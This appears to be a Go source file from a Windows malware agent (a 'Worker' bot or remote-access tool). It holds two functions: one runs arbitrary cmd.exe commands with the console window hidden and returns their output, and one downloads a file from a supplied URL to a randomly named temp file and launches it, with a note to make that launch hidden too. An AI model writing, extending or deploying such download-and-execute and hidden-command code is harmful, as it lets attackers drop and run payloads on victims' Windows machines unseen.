package win

import (
	"Worker/utils"
	"golang.org/x/sys/windows"
	"os"
	"os/exec"
	"path/filepath"
)

func ExecuteCommand(args ...string) (string, error) {
	cmdArgs := make([]string, len(args)+1)
	cmdArgs[0] = "/C"
	copy(cmdArgs[1:], args)
	cmd := exec.Command("cmd", cmdArgs...)
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func DownloadNExecute(url, format string) error { // TODO: start hidden
	fileName := filepath.Join(os.TempDir(), utils.RandomAlphaNumStr(10)+format) // TODO: export tempdir to constant
	if err := utils.DownloadFile(url, fileName); err != nil {
		return err
	}
	args := []string{"/C", "start", fileName}
	return exec.Command("cmd", args...).Start()
}
